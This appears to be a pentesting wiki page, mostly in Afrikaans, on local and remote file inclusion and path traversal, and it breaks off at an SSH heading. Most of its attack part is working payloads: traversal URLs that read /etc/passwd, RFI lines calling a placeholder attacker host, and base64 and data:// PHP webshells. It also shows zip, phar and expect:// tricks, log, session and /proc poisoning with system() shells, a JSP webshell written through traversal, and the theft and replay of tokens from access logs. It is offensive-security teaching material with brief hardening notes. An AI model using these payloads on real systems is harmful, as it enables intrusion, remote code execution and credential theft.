# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die lêer word van 'n afstandsbediener gelaai (Beste: Jy kan die kode skryf en die bediener sal dit uitvoer). In php is dit standaard **uitgeskakel** (**allow_url_include**).\
**Local File Inclusion (LFI):** Die bediener laai 'n plaaslike lêer.

Die kwesbaarheid ontstaan wanneer die gebruiker op enige wyse die lêer kan beheer wat deur die bediener gelaai gaan word.

Kwetsbare **PHP functions**: require, require_once, include, include_once

'n Interessante hulpmiddel om hierdie kwesbaarheid te benut: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie \*nix LFI-lyste te meng en meer paaie by te voeg, het ek hierdie geskep:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` vir `\` te verander\
Probeer ook om `../../../../../` by te voeg

'n Lys wat verskeie tegnieke gebruik om die file /etc/password te vind (om te kontroleer of die vulnerability bestaan) kan hier gevind word [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Samevoeging van verskillende wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` vir `\` te verander\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg

'n Lys wat verskeie tegnieke gebruik om die file /boot.ini te vind (om te kontroleer of die vulnerability bestaan) kan hier gevind word [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kyk na die LFI-lys van linux.

## Basiese LFI en bypasses

Al die voorbeelde is vir Local File Inclusion maar kan ook op Remote File Inclusion toegepas word (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences nie-rekursief verwyder
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass om meer chars aan die einde van die verskafde string toe te voeg (bypass van: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Encoding**

Jy kan nie-standaard enkoderinge gebruik soos double URL encode (en ander):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Vanuit bestaande gids

Miskien kontroleer die back-end die gidspad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verken lêerstelselgidse op 'n bediener

Die lêerstelsel van 'n bediener kan rekursief verken word om gidse, nie net lêers nie, te identifiseer deur sekere tegnieke te gebruik. Hierdie proses behels die bepaling van die gidsdiepte en die ondersoek na die bestaan van spesifieke vouers. Hieronder is 'n gedetaileerde metode om dit te bereik:

1. **Bepaal gidsdiepte:** Bepaal die diepte van jou huidige gids deur suksesvol die `/etc/passwd`-lêer te haal (van toepassing as die bediener is Linux-based). 'n Voorbeeld-URL kan soos volg gestruktureer wees en dui 'n diepte van drie aan:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Soek na vouers:** Voeg die naam van die vermoedelike vouer (bv., `private`) by die URL, en navigeer dan terug na `/etc/passwd`. Die ekstra gidsvlak vereis dat die diepte met een verhoog moet word:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreteer die Uitkomste:** Die bediener se reaksie dui aan of die gids bestaan:
- **Fout / Geen Uitset:** Die gids `private` bestaan waarskynlik nie op die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die aanwesigheid van die gids `private` word bevestig.
4. **Rekursiewe Verkenning:** Gevonde gidses kan verder ondersoek word vir subgidse of lêers deur dieselfde tegniek of tradisionele Local File Inclusion (LFI)-metodes te gebruik.

Om gidse op verskillende plekke in die lêerstelsel te verken, pas die payload ooreenkomstig aan. Byvoorbeeld, om te kontroleer of `/var/www/` 'n `private` gids bevat (aangenome dat die huidige gids op 'n diepte van 3 is), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation is 'n metode wat gebruik word om lêerpaaie in webtoepassings te manipuleer. Dit word dikwels gebruik om toegang tot beperkte lêers te kry deur sekere sekuriteitsmaatreëls te omseil wat ekstra karakters aan die einde van lêerpaaie heg. Die doel is om 'n lêerpad te konstruer wat, sodra dit deur die sekuriteitsmaatreël verander is, steeds na die verlangde lêer wys.

In PHP kan verskeie voorstellings van 'n lêerpad as ekwivalent beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` word almal as dieselfde pad behandel.
- Wanneer die laaste 6 karakters `passwd` is, verander die byvoeging van 'n `/` (wat dit `passwd/` maak) nie die geteikende lêer nie.
- Op dieselfde wyse, as `.php` aan 'n lêerpad aangeheg is (soos `shellcode.php`), sal die toevoeging van `/.` aan die einde die betrokke lêer nie verander nie.

Die onderstaande voorbeelde demonstreer hoe om path truncation te gebruik om toegang tot `/etc/passwd` te kry, 'n algemene teiken weens die sensitiewe inhoud daarvan (inligting oor gebruikersrekeninge):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's kan die aantal traversals wat nodig is ongeveer 2027 wees, maar hierdie getal kan wissel na gelang van die bediener se konfigurasie.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) gekombineer met ekstra puntsegmente en karakters kan gebruik word om deur die lêerstelsel te navigeer, wat die deur die bediener aangehegte stringe effektief kan ignoreer.
- **Determining the Required Number of Traversals**: Deur poging en fout kan 'n mens die presiese aantal `../`-reekse vind wat nodig is om na die root-direktorie en dan na `/etc/passwd` te navigeer, en sodoende seker te maak dat enige aangehegte stringe (soos `.php`) geneutraliseer word, maar die gewenste pad (`/etc/passwd`) intak bly.
- **Starting with a Fake Directory**: Dit is algemeen om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word gebruik as 'n voorsorgmaatreël of om te voldoen aan die bediener se padontledingslogika.

Wanneer path truncation techniques toegepas word, is dit noodsaaklik om die bediener se path parsing gedrag en lêerstelselstruktuur te verstaan. Elke scenario kan 'n ander benadering vereis, en toetsing is dikwels nodig om die doeltreffendste metode te vind.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard gedeaktiveer omdat **`allow_url_include`** **Off** is. Dit moet **On** wees om te werk, en in daardie geval kan jy 'n PHP-lêer vanaf jou bediener include en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
As om een of ander rede **`allow_url_include`** is **Aan**, maar PHP **filtreer** toegang tot eksterne webblaaie, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data-protokol met base64 gebruik om 'n b64 PHP-kode te dekodeer en RCE te kry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die attacker 'n string nodig gehad het wat op `.txt` eindig, sodat die string daarmee eindig en na die b64 decode daardie deel net rommel sal teruggee en die werklike PHP code ingesluit sal word (en gevolglik uitgevoer).

Nog 'n voorbeeld **not using the `php://` protocol** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Wortelelement

In python, in 'n kode soos hierdie:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute pad** aan **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die bedoelde gedrag volgens [die docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> As 'n komponent 'n absolute pad is, word alle vorige komponente weggegooi en gaan die saamvoeging voort vanaf die absolute padkomponent.

## Java: lys van gidse

Dit lyk asof as jy 'n Path Traversal in Java het en jy **vir 'n gids vra** in plaas van 'n lêer, 'n **lys van die gids teruggestuur** word. Dit gebeur nie in ander tale nie (sover ek weet).

## Top 25 parameters

Hier is 'n lys van die Top 25-parameters wat kwesbaar kan wees vir local file inclusion (LFI) (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI met PHP wrappers & protokolle

### php://filter

PHP-filters laat basiese **wysigingsoperasies op die data** toe voordat dit gelees of geskryf word. Daar is 5 kategorieë filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags uit die data (alles tussen die "<" en ">" karakters)
- Let daarop dat hierdie filter in moderne weergawes van PHP verdwyn het
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformeer na 'n ander enkodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle enkoderinge** wat ondersteun word te kry, voer in die konsole uit: `iconv -l`

> [!WARNING]
> Deur die `convert.iconv.*` conversion filter te misbruik kan jy **arbitrêre teks genereer**, wat nuttig kan wees om arbitrêre teks te skryf of om 'n funksie soos include ewekansige teks te laat verwerk. Vir meer inligting kyk [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimeer die inhoud (nuttig as jy baie inligting exfiltrating)
- `zlib.inflate`: Dekomprimeer die data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Verouderd
- `mdecrypt.*` : Verouderd
- Other Filters
- As jy in php `var_dump(stream_get_filters());` uitvoer, kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: keer HTTP chunked encoding om
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die deel "php://filter" is case insensitive

### Gebruik php filters as oracle om willekeurige lêers te lees

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) is 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder dat die uitvoer teruggegee word deur die bediener. Hierdie tegniek is gebaseer op 'n **boolean exfiltration of the file (char by char) using php filters** as oracle. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak sodat php 'n uitsondering sal gooi.

In die oorspronklike post vind jy 'n gedetailleerde verduideliking van die tegniek, maar hier is 'n vinnige opsomming:

- Gebruik die codec **`UCS-4LE`** om die leidende karakter van die teks aan die begin te plaas en sodoende die grootte van die string eksponensieel te laat toeneem.
- Dit sal gebruik word om 'n **teks te genereer wat so groot is as die aanvanklike letter korrek geraden word** dat php 'n **error** sal veroorsaak.
- Die **dechunk** filter sal **alles verwyder as die eerste char nie an hexadecimal is nie**, sodat ons kan weet of die eerste char hex is.
- Dit, gekombineer met die vorige (en ander filters afhangend van die gerade letter), sal ons toelaat om 'n letter aan die begin van die teks te raai deur te kyk wanneer ons genoeg transformasies toepas om dit nie meer 'n hexadecimal karakter te maak nie. Want as hex, sal dechunk dit nie verwyder nie en die aanvanklike bom sal 'n php error veroorsaak.
- Die codec **convert.iconv.UNICODE.CP930** omskakel elke letter na die volgende (dus na hierdie codec: a -> b). Dit laat ons toe om te ontdek of die eerste letter byvoorbeeld 'n `a` is aangesien as ons 6 keer hierdie codec toepas a->b->c->d->e->f->g die letter nie meer 'n hexadecimal karakter is nie, daarom verwyder dechunk dit nie en die php error word geaktiveer aangesien dit saam met die aanvanklike bom vermeerder.
- Deur ander transformasies soos **rot13** aan die begin te gebruik, is dit moontlik om ander chars te leak soos n, o, p, q, r (en ander codecs kan gebruik word om ander letters in die hex-reeks te skuif).
- Wanneer die aanvanklike char 'n nommer is, moet dit base64 encode word en die eerste 2 letters geleak word om die nommer te leak.
- Die finale probleem is om te sien **hoe om meer as die aanvanklike letter te leak**. Deur order memory filters te gebruik soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is dit moontlik om die volgorde van die karakters te verander en ander letters van die teks in die eerste posisie te kry.
- En om in staat te wees om **further data** te verkry, is die idee om **generate 2 bytes of junk data at the beginning** met **convert.iconv.UTF16.UTF16**, pas **UCS-4LE** toe om dit **pivot with the next 2 bytes**, en d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the desired bit to leak.

In die post is 'n tool om dit outomaties uit te voer ook leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper laat toe om toegang tot file descriptors wat die proses oop het, te kry. Potensieel nuttig om die inhoud van geopende lêers te exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook **php://stdin, php://stdout and php://stderr** gebruik om onderskeidelik toegang tot die **file descriptors 0, 1 and 2** te kry (ek is nie seker hoe dit in 'n aanval nuttig kan wees nie)

### zip:// and rar://

Laai 'n Zip- of Rar-lêer op met 'n PHPShell daarin en kry toegang daartoe.\\
Om die rar-protokol te kan misbruik, moet dit **spesifiek geaktiveer word**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Neem kennis dat hierdie protokol beperk word deur PHP-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan kode hiermee uitvoer:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spesifiseer jou payload in die POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` vir lêerlaai gebruik. Die onderstaande PHP-kodefragment demonstreer die skep van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar` lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
By uitvoering sal 'n lêer met die naam `test.phar` geskep word, wat moontlik benut kan word om Local File Inclusion (LFI)-kwesbaarhede te eksploiteer.

In gevalle waar die LFI slegs lêerlesing uitvoer en nie die PHP-kode binne-in uitvoer nie — byvoorbeeld wanneer daar gebruik gemaak word van funksies soos `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, of `filesize()` — kan daar 'n poging aangewend word om 'n deserialization-kwesbaarheid te misbruik. Hierdie kwesbaarheid hang saam met die lees van lêers via die `phar`-protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie kort samevatting: 'n **3 byte overflow** in die PHP heap is misbruik om die **ketting van free chunks** van 'n spesifieke grootte te **verander** sodat dit moontlik was om **enige iets op enige adres te skryf**, waarna 'n hook bygevoeg is om **`system`** aan te roep.\
Dit was moontlik om chunks van spesifieke groottes te alloc deur meer php filters te misbruik.

### More protocols

Kyk na meer moontlike[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit nuttig kan wees in 'n file inclusion attack nie)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s)-URL's
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s)-URL's
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressiestrome
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind padname wat by 'n patroon pas (Dit gee niks printbaars terug nie, dus nie regtig nuttig hier nie)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audiostrome (Nie nuttig om ewekansige lêers te lees nie)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)-risiko's in PHP is besonder hoog wanneer daar met die 'assert'-funksie gewerk word, aangesien dit kode binne strings kan uitvoer. Dit is veral problematies as insette wat directory traversal-karakters soos ".." bevat, nagegaan word maar nie behoorlik gesuiwer nie.

Byvoorbeeld, PHP-kode kan ontwerp wees om directory traversal te voorkom soos volg:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Alhoewel dit daarop gemik is om traversal te stop, skep dit onbedoeld ’n vektor vir code injection. Om dit te misbruik om lêerinhoud te lees, kan ’n attacker gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, om willekeurige stelselopdragte uit te voer, kan 'n mens gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy die **file path** van 'n **PHP function** beheer wat 'n **file** sal **access**, maar jy sal nie die inhoud van die file sien nie (soos 'n eenvoudige oproep na **`file()`**) en die inhoud nie vertoon word nie.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word daar verduidelik hoe 'n blind path traversal via 'n PHP filter misbruik kan word om **exfiltrate the content of a file via an error oracle**.

Kortliks, die tegniek gebruik die **"UCS-4LE" encoding** om die inhoud van 'n file so **big** te maak dat die **PHP function opening** die file 'n **error** sal trigger.

Daarna, om die eerste char te leak, word die filter **`dechunk`** saam met ander soos **base64** of **rot13** gebruik, en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om ander chars aan die beginning te plaas en hulle te leak.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede sien die genoemde post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wanneer server-side kode wat files inneem/oplaai die bestemmingspad bou deur user-controlled data te gebruik (bv. 'n filename of URL) sonder om dit te canonicalise en te valideer, kan `..` segments en absolute paths uit die beoogde directory ontsnap en 'n arbitrary file write veroorsaak. As jy die payload onder 'n web-exposed directory kan plaas, kry jy gewoonlik unauthenticated RCE deur 'n webshell neer te sit.

Typical exploitation workflow:
- Identifiseer 'n write primitive in 'n endpoint of background worker wat 'n path/filename aanvaar en inhoud na disk skryf (bv. message-driven ingestion, XML/JSON command handlers, ZIP extractors, ens.).
- Bepaal web-exposed directories. Algemene voorbeelde:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Skep 'n traversal pad wat uit die beoogde stoor-gids in die webroot breek, en sluit jou webshell inhoud in.
- Blaai na die geplaatste payload en voer opdragte uit.

Notes:
- Die kwesbare diens wat die write uitvoer kan op 'n non-HTTP port luister (bv. 'n JMF XML listener op TCP 4004). Die hoof web portal (ander poort) sal later jou payload bedien.
- Op Java stacks word hierdie file writes dikwels geïmplementeer met eenvoudige `File`/`Paths` concatenation. Gebrek aan canonicalisation/allow-listing is die kernfout.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- Los dit op na 'n kanonieke pad en dwing af dat dit 'n afstammeling is van 'n toegelate basisgids.
- Weier enige pad wat `..`, absolute wortels, of stasieletters bevat; verkies gegenereerde `filenames`.
- Hardloop die writer as 'n rekening met lae bevoegdhede en skei skryfgidse van geserveerde wortels.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

As die Apache of Nginx-bediener **vulnerable to LFI** binne die include-funksie is, kan jy probeer toegang te kry tot **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, en binne die **user agent** of in 'n **GET parameter** 'n php shell soos **`<?php system($_GET['c']); ?>`** te plaas en daardie lêer te include

> [!WARNING]
> Neem kennis dat **as jy dubbele aanhalingstekens gebruik** vir die shell in plaas van **enkelaanhalingstekens**, sal die dubbele aanhalingstekens verander word na die string "_**quote;**_", **PHP sal daar 'n fout gooi** en **niks anders sal uitgevoer word nie**.
>
> Maak ook seker dat jy die **payload korrek skryf**, anders sal PHP elke keer 'n fout gee wanneer dit probeer om die log-lêer te laai en jy sal nie 'n tweede geleentheid hê nie.

Dit kan ook in ander logs gedoen word, maar **wees versigtig,** die kode binne die logs kan URL encoded wees en dit kan die Shell vernietig. Die header **authorisation "basic"** bevat "user:password" in Base64 en dit word binne die logs gedekodeer. Die PHPShell kan binne hierdie header ingesit word.\
Ander moontlike logpade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Lees access logs om GET-based auth tokens te oes (token replay)

Baie apps aanvaar per ongeluk session/auth tokens via GET (bv., AuthenticationToken, token, sid). As jy 'n path traversal/LFI-primitive het wat toegang gee tot die webbediener se logs, kan jy daardie tokens uit die access logs steel en dit hergebruik om authentisering volledig te omseil.

Hoe om dit te doen:
- Gebruik die traversal/LFI om die web server access log te lees. Algemene plekke:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Sommige endpoints lewer lêerleesresultate Base64-encoded terug. Indien so, decodeer plaaslik en ondersoek die logreëls.
- Gebruik grep om na GET-versoeke te soek wat 'n token-parameter insluit en vang die waarde, en speel dit dan terug teen die application entry point.

Voorbeeldvloei (generies):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekodeer die body as dit Base64 is, en replay 'n captured token:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Aantekeninge:
- Tokens in URLs word standaard gelog; aanvaar nooit bearer tokens via GET in produksie stelsels.
- As die app verskeie token-name ondersteun, soek na algemene sleutels soos AuthenticationToken, token, sid, access_token.
- Roteer enige tokens wat moontlik na logs leaked.

### Via E-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer dit include in die pos van die gebruiker met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Upload baie shells (byvoorbeeld: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), met $PID = PID van die proses (kan brute forced word) en $FD die file descriptor (kan ook brute forced word)

### Via /proc/self/environ

Soos 'n log-lêer, stuur die payload in die User-Agent; dit sal weerspieël word binne die /proc/self/environ lêer
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Deur upload

Indien jy 'n file kan upload, inject net die shell payload daarin (bv : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou, is dit die beste om dit in die metadata van die pictures/doc/pdf in te voeg

### Via ZIP-lêer oplaai

Laai 'n ZIP-lêer op wat 'n gekomprimeerde PHP shell bevat en kry toegang tot:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Deur PHP sessions

Kontroleer of die webwerf PHP Session (PHPSESSID) gebruik
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessies gestoor in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die cookie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP session file in te sluit
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Deur ssh

